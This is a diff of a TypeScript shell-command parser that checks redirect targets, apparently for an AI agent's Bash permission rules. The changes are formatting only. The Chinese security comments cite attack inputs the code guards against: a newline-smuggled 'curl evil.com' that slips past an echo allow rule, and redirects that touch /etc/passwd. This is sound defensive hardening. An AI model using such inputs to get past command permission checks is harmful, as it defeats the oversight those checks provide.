@@ -1,4 +1,4 @@
-import { randomBytes } from 'crypto'
+import { randomBytes } from 'node:crypto'
 import type { ControlOperator, ParseEntry } from 'shell-quote'
 import {
   type CommandPrefixResult,
@@ -51,16 +51,22 @@ function isStaticRedirectTarget(target: string): boolean {
   // `out` 并读取 `/etc/passwd`，但合并后给出 `out /etc/passwd` 作为"目标"。
   // 接受这个合并结果会返回 `['cat']`，pathValidation 永远看不到该路径。
   // 拒绝包含空白字符或引号字符的目标（引号表示占位符恢复保留了被引用的参数）。
-  if (/[\s'"]/.test(target)) return false
+  if (/[\s'"]/.test(target)) {
+    return false
+  }
   // 拒绝空字符串——path.resolve(cwd, '') 返回 cwd（总是被允许的）。
-  if (target.length === 0) return false
+  if (target.length === 0) {
+    return false
+  }
   // 安全性（parser 差异加固）：shell-quote 将词首位置的 `#foo` 解析为注释
   // token。在 bash 中，空白后的 `#` 也会开始注释（`> #file` 是语法错误）。
   // 但 shell-quote 将其作为注释对象返回；splitCommandWithOperators 将其映射
   // 回字符串 `#foo`。这与 extractOutputRedirections（将注释对象视为非字符串，
   // 遗漏目标）不同。虽然 `> #file` 在 bash 中不可执行，但拒绝 `#` 前缀
   // 的目标可消除这一差异。
-  if (target.startsWith('#')) return false
+  if (target.startsWith('#')) {
+    return false
+  }
   return (
     !target.startsWith('!') && // 无历史扩展如 !!, !-1, !foo
     !target.startsWith('=') && // 无 Zsh 等号扩展（=cmd 扩展为 /path/to/cmd）
@@ -166,14 +172,14 @@ export function splitCommandWithOperators(command: string): string[] {
             // 如果是 NEW_LINE，终止前一个字符串并开始新命令
             parts.push(null)
           } else {
-            parts[parts.length - 1] += ' ' + part
+            parts[parts.length - 1] += ` ${part}`
           }
           continue
         }
       } else if ('op' in part && part.op === 'glob') {
         // 如果前一个部分是字符串（不是操作符），将通配符与其合并
         if (parts.length > 0 && typeof parts[parts.length - 1] === 'string') {
-          parts[parts.length - 1] += ' ' + part.pattern
+          parts[parts.length - 1] += ` ${part.pattern}`
           continue
         }
       }
@@ -199,7 +205,7 @@ export function splitCommandWithOperators(command: string): string[] {
           const cleaned = part.comment
             .replaceAll(`"${placeholders.DOUBLE_QUOTE}`, placeholders.DOUBLE_QUOTE)
             .replaceAll(`'${placeholders.SINGLE_QUOTE}`, placeholders.SINGLE_QUOTE)
-          return '#' + cleaned
+          return `#${cleaned}`
         }
         if ('op' in part && part.op === 'glob') {
           return part.pattern
@@ -692,7 +698,9 @@ export function extractOutputRedirections(cmd: string): {
 
   for (let i = 0; i < parsed.length; i++) {
     const part = parsed[i]
-    if (!part) continue
+    if (!part) {
+      continue
+    }
 
     const [prev, next] = [parsed[i - 1], parsed[i + 1]]
 
@@ -751,7 +759,9 @@ function isSimpleTarget(target: ParseEntry | undefined): target is string {
   // 空目标可能来自 shell-quote 为 `\<newline>` 发出的 ''。
   // 在 bash 中，`> \<newline>/etc/passwd` 合并续行并写入 /etc/passwd。
   // 与 extractOutputRedirections 中的续行合并修复形成纵深防御。
-  if (typeof target !== 'string' || target.length === 0) return false
+  if (typeof target !== 'string' || target.length === 0) {
+    return false
+  }
   return (
     !target.startsWith('!') && // 历史扩展模式如 !!, !-1, !foo
     !target.startsWith('=') && // Zsh 等号扩展（=cmd 扩展为 /path/to/cmd）
@@ -781,11 +791,17 @@ function hasDangerousExpansion(target: ParseEntry | undefined): boolean {
   // 而非字符串。`> *.sh` 作为重定向目标在运行时扩展（单匹配 → 覆盖，
   // 多匹配 → 歧义重定向错误）。将其标记为危险。
   if (typeof target === 'object' && target !== null && 'op' in target) {
-    if (target.op === 'glob') return true
+    if (target.op === 'glob') {
+      return true
+    }
     return false
   }
-  if (typeof target !== 'string') return false
-  if (target.length === 0) return false
+  if (typeof target !== 'string') {
+    return false
+  }
+  if (target.length === 0) {
+    return false
+  }
   return (
     target.includes('$') ||
     target.includes('%') ||
@@ -1052,7 +1068,9 @@ function handleFileDescriptorRedirection(
   const isFdTarget = typeof target === 'string' && /^\d+$/.test(target.trim())
 
   // 始终从 kept 中移除 fd 编号
-  if (kept.length > 0) kept.pop()
+  if (kept.length > 0) {
+    kept.pop()
+  }
 
   // 安全性：在任何提前返回之前先检查危险扩展
   // 这会捕获如 2>$HOME/file 或 2>%TEMP%/file 的情况
@@ -1090,8 +1108,12 @@ function detectCommandSubstitution(
   kept: ParseEntry[],
   index: number,
 ): boolean {
-  if (!prev || typeof prev !== 'string') return false
-  if (prev === '$') return true // 独立的 $
+  if (!prev || typeof prev !== 'string') {
+    return false
+  }
+  if (prev === '$') {
+    return true // 独立的 $
+  }
 
   if (prev.endsWith('$')) {
     // 检查变量赋值模式（如 result=$）
@@ -1102,7 +1124,9 @@ function detectCommandSubstitution(
     // 查找闭合 ) 后紧跟的文本
     let depth = 1
     for (let j = index + 1; j < kept.length && depth > 0; j++) {
-      if (isOperator(kept[j], '(')) depth++
+      if (isOperator(kept[j], '(')) {
+        depth++
+      }
       if (isOperator(kept[j], ')') && --depth === 0) {
         const after = kept[j + 1]
         return !!(after && typeof after === 'string' && !after.startsWith(' '))
@@ -1115,7 +1139,9 @@ function detectCommandSubstitution(
 // 辅助函数：检查字符串是否需要引用
 function needsQuoting(str: string): boolean {
   // 不引用文件描述符重定向（如 '2>', '2>>', '1>' 等）
-  if (/^\d+>>?$/.test(str)) return false
+  if (/^\d+>>?$/.test(str)) {
+    return false
+  }
 
   // 引用包含任何空白字符（空格、制表符、换行符、回车符等）的字符串。
   // 安全性：必须匹配正则 `\s` 类匹配的所有字符。
@@ -1123,22 +1149,30 @@ function needsQuoting(str: string): boolean {
   // 如果 reconstructCommand 发出未引用的 `\n` 或 `\r`，stripSafeWrappers
   // 会跨越它匹配，从 `TZ=UTC\necho curl evil.com` 中剥离 `TZ=UTC`——
   // 匹配 `Bash(echo:*)`，而 bash 在换行符处分词并运行 `curl`。
-  if (/\s/.test(str)) return true
+  if (/\s/.test(str)) {
+    return true
+  }
 
   // 单字符 shell 操作符需要引用以避免歧义
-  if (str.length === 1 && '><|&;()'.includes(str)) return true
+  if (str.length === 1 && '><|&;()'.includes(str)) {
+    return true
+  }
 
   return false
 }
 
 // 辅助函数：以适当间距添加 token
 function addToken(result: string, token: string, noSpace = false): string {
-  if (!result || noSpace) return result + token
-  return result + ' ' + token
+  if (!result || noSpace) {
+    return result + token
+  }
+  return `${result} ${token}`
 }
 
 function reconstructCommand(kept: ParseEntry[], originalCmd: string): string {
-  if (!kept.length) return originalCmd
+  if (!kept.length) {
+    return originalCmd
+  }
 
   let result = ''
   let cmdSubDepth = 0
@@ -1168,7 +1202,7 @@ function reconstructCommand(kept: ParseEntry[], originalCmd: string): string {
 
       // 特殊情况：在 <( 后添加空格
       if (result.endsWith('<(')) {
-        result += ' ' + str
+        result += ` ${str}`
       } else {
         result = addToken(result, str, noSpace)
       }
@@ -1181,7 +1215,9 @@ function reconstructCommand(kept: ParseEntry[], originalCmd: string): string {
     }
 
     // 处理操作符
-    if (typeof part !== 'object' || !part || !('op' in part)) continue
+    if (typeof part !== 'object' || !part || !('op' in part)) {
+      continue
+    }
     const op = part.op as string
 
     // 处理通配符模式
@@ -1257,7 +1293,9 @@ function reconstructCommand(kept: ParseEntry[], originalCmd: string): string {
         continue
       }
 
-      if (cmdSubDepth > 0) cmdSubDepth--
+      if (cmdSubDepth > 0) {
+        cmdSubDepth--
+      }
       result += ')' // ) 前不加空格
       continue
     }
